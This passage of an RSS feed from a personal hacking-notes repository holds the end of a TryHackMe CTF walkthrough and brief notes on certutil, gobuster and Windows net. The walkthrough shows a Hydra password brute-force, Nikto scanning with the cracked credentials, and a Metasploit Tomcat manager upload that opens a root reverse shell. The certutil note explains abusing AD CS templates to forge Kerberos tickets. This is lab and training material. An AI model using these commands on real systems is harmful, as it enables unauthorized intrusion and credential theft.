|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/    5.0 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/ *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED   *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0 https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
|       EDB-ID:42745    5.0 https://vulners.com/exploitdb/EDB-ID:42745  *EXPLOIT*
|       EDB-ID:40909    5.0 https://vulners.com/exploitdb/EDB-ID:40909  *EXPLOIT*
|       CVE-2021-34798  5.0 https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0 https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0 https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0 https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0 https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0 https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0 https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0 https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0 https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0 https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0 https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0 https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0 https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0 https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0 https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0 https://vulners.com/cve/CVE-2016-4979
|       1337DAY-ID-28573    5.0 https://vulners.com/zdt/1337DAY-ID-28573    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/   4.9 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/    *EXPLOIT*
|       CVE-2019-0197   4.9 https://vulners.com/cve/CVE-2019-0197
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/    *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/  4.3 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/   *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/ *EXPLOIT*
|       CVE-2020-11985  4.3 https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3 https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3 https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3 https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3 https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3 https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3 https://vulners.com/cve/CVE-2016-1546
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3 https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575    4.3 https://vulners.com/zdt/1337DAY-ID-33575    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/  3.5 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/  *EXPLOIT*
|       CVE-2018-1283   3.5 https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3 https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:152441  0.0 https://vulners.com/packetstorm/PACKETSTORM:152441  *EXPLOIT*
|_      MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/   0.0 https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/    *EXPLOIT*
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
|_http-server-header: Apache-Coyote/1.1
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/30%OT=22%CT=1%CU=32123%PV=Y%DS=4%DC=T%G=Y%TM=61F71BC
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%TS=8)SEQ(SP=104%GC
OS:D=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M50
OS:6NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%
OS:W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.019 days (since Sun Jan 30 15:47:12 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   29.74 ms  10.13.0.1
2   ... 3
4   171.05 ms 10.10.28.154

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 30 16:14:13 2022 -- 1 IP address (1 host up) scanned in 1300.33 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, we've got the following ports:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;22: OpenSSH (nmap says it's 7.2p2, but connecting to it directly reveals it to be 8.7p1)&lt;/li&gt;&lt;li&gt;80: Apache httpd 2.4.18&lt;/li&gt;&lt;li&gt;1234: Apache Tomcat + Coyote 1.1&lt;/li&gt;&lt;li&gt;8009: Apache Jserv 1.3&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There's a hidden &lt;code&gt;/protected/&lt;/code&gt; directory on port 80 that seems to be password-protected.&lt;/p&gt;&lt;p&gt;No obvious exploits here, but this is enough information to get us a few flags.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 3: What directory has basic authentication? - protected&lt;/p&gt;&lt;p&gt;FLAG 5: What other port that serves a webs service is open on the machine? - 1234&lt;/p&gt;&lt;p&gt;FLAG 6: What is the name and version of the software running on that port? - Apache Tomcat/7.0.88&lt;/p&gt;&lt;p&gt;FLAG 8: What is the server version (run the scan against port 80)? - Apache/2.4.18&lt;/p&gt;&lt;p&gt;FLAG 9: What version of Apache-Coyote is this service using? - 1.1&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;We'll also run a scan with dirbuster (normally I use gobuster, but I'm trying to operate in the spirit of this CTF):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dirbuster&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-l&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.28.154&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This finds the following directories:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;/icons/&lt;/li&gt;&lt;li&gt;/icons/small/&lt;/li&gt;&lt;li&gt;/guidelines/&lt;/li&gt;&lt;li&gt;/protected/&lt;/li&gt;&lt;li&gt;/server-status/&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This gives us another flag.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 1: What directory can you find, that begins with a &quot;g&quot;? â &lt;code&gt;guidelines&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Going to this directory reveals a single message:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Hey &lt;span class=&quot;kw&quot;&gt;&amp;lt;b&amp;gt;&lt;/span&gt;bob&lt;span class=&quot;kw&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt;, did you update that TomCat server?&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn't find anything obvious on Exploit DB. I'll come back to that, since we have another flag.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 2: Whose name can you find from this directory? â &lt;code&gt;bob&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;We'll deploy Hydra against the http-basic authentication protecting &lt;code&gt;/protected/&lt;/code&gt;. I've never done this before, but a quick internet search reveals a potentially useful guide, as well as an additional walk-through clarifying how to use Hydra to crack Apache conf-based http-basic authentication. With this information in hand, we should (hopefully) be able to crack Bob's password using the following:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -l bob &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-P&lt;/span&gt; ~/.local/share/red-team/wordlists/rockyou.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-f&lt;/span&gt; -vV http-get://10.10.28.154/protected/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gets us another flag!&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 4: What is bob's password to the protected part of the website? â &lt;code&gt;bubbles&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;While it probably won't get us any more flags, I'm kinda curious what's in &lt;code&gt;/protected/&lt;/code&gt;. Unfortunately, the experience is kinda anti-climatic.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode html&quot;&gt;&lt;code class=&quot;sourceCode html&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;/br&amp;gt;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;lt;img&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; width=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; src=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;protected.png&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;This protected page has now moved to a different port.&lt;span class=&quot;kw&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Oh well.&lt;/p&gt;&lt;p&gt;The CTF does direct us to look at &lt;a href=&quot;http://10.10.28.154:1234/manager/html&quot;&gt;http://10.10.28.154:1234/manager/html&lt;/a&gt; (using Bob's password); that's just the Tomcat documentation by the looks of it. But if we throw Nikto against it, we can get ourselves another flag.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nikto&lt;/span&gt; -Format txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-host&lt;/span&gt; http://10.10.28.154:1234/manager/html &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-3&quot;&gt;&lt;a href=&quot;#cb7-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-id&lt;/span&gt; bob:bubbles -nossl -output tools-r-us.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The next flag is just looking for the number of &quot;Tomcat documentation&quot; files Nikto finds. Unfortunately, these don't get spit out until near the end of Nikto's run, so expect to wait a &lt;em&gt;long&lt;/em&gt; time!&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 7: How many documentation files did Nikto identify? â &lt;code&gt;5&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Alright, let's switch over to our last two flags, which imply that we can get RCE on this version of Tomcat. It looks like Apache Tomcat 7.0.88 was released on May 16, 2018. There's no obvious &lt;em&gt;vulnerability&lt;/em&gt; to exploit for this version, but after searching around a bit on the net I found a guide mentioning that RCE on Tomcat could be obtained via the &quot;manager&quot; application. And, indeed, looking at the info for the corresponding module in Metasploit (&lt;code&gt;exploit/multi/http/tomcat_mgr_upload&lt;/code&gt;) reveals that we can obtain RCE if we have access to the &lt;code&gt;/manager/html/upload&lt;/code&gt; component. Which we &lt;em&gt;do&lt;/em&gt;, because &lt;code&gt;/manager/html&lt;/code&gt; has the option to &quot;Select WAR file to upload&quot;.&lt;/p&gt;&lt;p&gt;Now, &lt;code&gt;exploit/multi/http/tomcat_mgr_upload&lt;/code&gt; only targets 32-bit Linux, and the server is running a 64-bit build (this can also be found in &lt;code&gt;/manager/html/&lt;/code&gt;), so we'll use the &quot;Java Universal&quot; target.&lt;/p&gt;&lt;pre class=&quot;msfconsole&quot;&gt;&lt;code&gt;use exploit/multi/http/tomcat_mgr_upload
set HttpPassword bubbles
set HttpUsername bob
set RHOSTS 10.10.28.154
set RPORT 1234
set LHOST 10.13.26.40
exploit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have a meterpreter shell! Running &lt;code&gt;getuid&lt;/code&gt; reveals that we're also running as &lt;code&gt;root&lt;/code&gt;. Ouch.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 10: What user did you get a shell as? â &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;We'll just drop to &lt;code&gt;shell&lt;/code&gt; in meterpreter to get the contents of &lt;code&gt;/root/flag.txt&lt;/code&gt;.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;FLAG 11: What text is in the file /root/flag.txt? â &lt;code&gt;ff1fc4a81affcc7688cf89ae7dc6e0e1&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hydra.md&quot;&gt;Using Hydra&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Nikto.md&quot;&gt;Using Nikto&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;Using &quot;gobuster&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;Exploit Database&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/&quot;&gt;Defeating HTTP Basic Auth with Hydra&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/&quot;&gt;Multiple Ways To Exploiting HTTP Authentication&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tomcat.apache.org/security-7.html&quot;&gt;Apache Tomcat 7.x vulnerabilities&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/&quot;&gt;Multiple Ways to Exploit Tomcat Manager&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 3 h 7 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/toolsrus&quot;&gt;TryHackMe: Tools'R'us&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Tools%27R%27us.md</guid>
		</item>
		<item>
			<title>Using "certutil"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22certutil%22.md</link>
			<description>&lt;h2 id=&quot;calculating-file-hashes&quot;&gt;Calculating File Hashes&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;CertUtil -hashfile &lt;span class=&quot;va&quot;&gt;$FILE_PATH&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ALGORITHM&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The algorithm can be excluded (in which case SHA1 is used).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/malresearching&quot;&gt;TryHackMe: MAL: Researching&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;enumerating-ad-cs-templates&quot;&gt;Enumerating AD CS Templates&lt;/h2&gt;&lt;p&gt;AD CS is AD's PKI, and is used on the back end for everything from provisioning disk encryption keys to user authentication. Certificate templates are a way to automate the certificate request process: Rather than an admin approving all CSRs manually, AD CS checks to see if a relevant &quot;template&quot; (which is really a template + associated settings + an access policy) exists that matches the supplied CSR and is configured to allow the requesting user to generate a certificate.&lt;/p&gt;&lt;p&gt;Enumerate all certificate templates from a domain-joined computer and domain-authenticated user:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;certutil -v -template&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;We need to be able to actually request a certificate. This is indicated by an &lt;code&gt;Allow Enroll&lt;/code&gt; or &lt;code&gt;Allow Full Control&lt;/code&gt; permission that has been assigned to a group or user you have access to.&lt;/li&gt;&lt;li&gt;The certificate needs to be usable for Kerberos authentication. This is true when the &quot;Enhanced Key Usage&quot; extension allows for &quot;Client Authentication&quot;.&lt;/li&gt;&lt;li&gt;We need to be able to set the certificate's &quot;Subject Alternative Name&quot;. This is indicated by &lt;code&gt;TemplatePropSubjectNameFlags&lt;/code&gt; (a.k.a. &lt;code&gt;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&lt;/code&gt;) being set to &lt;code&gt;1&lt;/code&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;(There are actually some other requirements - like fully automated certificate provisioning - but &lt;em&gt;by default&lt;/em&gt; these are all satisfied.)&lt;/p&gt;&lt;p&gt;If a certificate has the following properties, then we can use it to create a certificate in the name of another user and then &lt;em&gt;forge&lt;/em&gt; Kerberos tickets for that user with a tool like Rubeus.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/certified-pre-owned-d95910965cd2&quot;&gt;SpectreOps: Certified Pre-Owned&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Rubeus.md&quot;&gt;Using Rubeus&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22certutil%22.md</guid>
		</item>
		<item>
			<title>Using "gobuster"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22gobuster%22.md</link>
			<description>&lt;p&gt;Gobuster is pretty straight-forward. Use &lt;code&gt;gobuster --help&lt;/code&gt; to get general help, and &lt;code&gt;gobuster $CMD --help&lt;/code&gt; to get detailed help specific to a particular command.&lt;/p&gt;&lt;p&gt;Increasing threads (&lt;code&gt;-t&lt;/code&gt;) in gobuster makes a &lt;em&gt;big&lt;/em&gt; difference in performance. (Probably makes you noisier tooâ¦)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;TryHackMe: CC: Pen Testing&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22gobuster%22.md</guid>
		</item>
		<item>
			<title>Using "net"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22net%22.md</link>
			<description>&lt;p&gt;The Windows &lt;code&gt;net&lt;/code&gt; command is an older (but still useful) CLI multitool.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;net users&lt;/code&gt; - enumerate all local users&lt;/li&gt;&lt;li&gt;&lt;code&gt;net user $USER&lt;/code&gt; - retrieve information about the &lt;em&gt;local&lt;/em&gt; user &lt;code&gt;$USER&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;net users /domain&lt;/code&gt; - enumerate domain users&lt;/li&gt;&lt;li&gt;&lt;code&gt;net user $USER /domain&lt;/code&gt; - retrieve information about the &lt;em&gt;domain&lt;/em&gt; user &lt;code&gt;$USER&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;net localgroup&lt;/code&gt; - enumerate local groups&lt;/li&gt;&lt;li&gt;&lt;code&gt;net localgroup $GROUP&lt;/code&gt; - show members of local group &lt;code&gt;$GROUP&lt;/code&gt; (try with &lt;code&gt;administrators&lt;/code&gt;!)&lt;/li&gt;&lt;li&gt;&lt;code&gt;net group /domain&lt;/code&gt; - enumerate domain groups&lt;/li&gt;&lt;li&gt;&lt;code&gt;net group $GROUP /domain&lt;/code&gt; - show members (users only!) of domain group &lt;code&gt;$GROUP&lt;/code&gt; (try with &lt;code&gt;Domain Admins&lt;/code&gt;!)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that Windows allows for duplicate domain and local users; this is why users get prefixed by the domain or local machine name. Comparing the output of &lt;code&gt;whoami&lt;/code&gt; and &lt;code&gt;hostname&lt;/code&gt; will reveal if you're logged in with a local or domain account.&lt;/p&gt;&lt;p&gt;Remember that 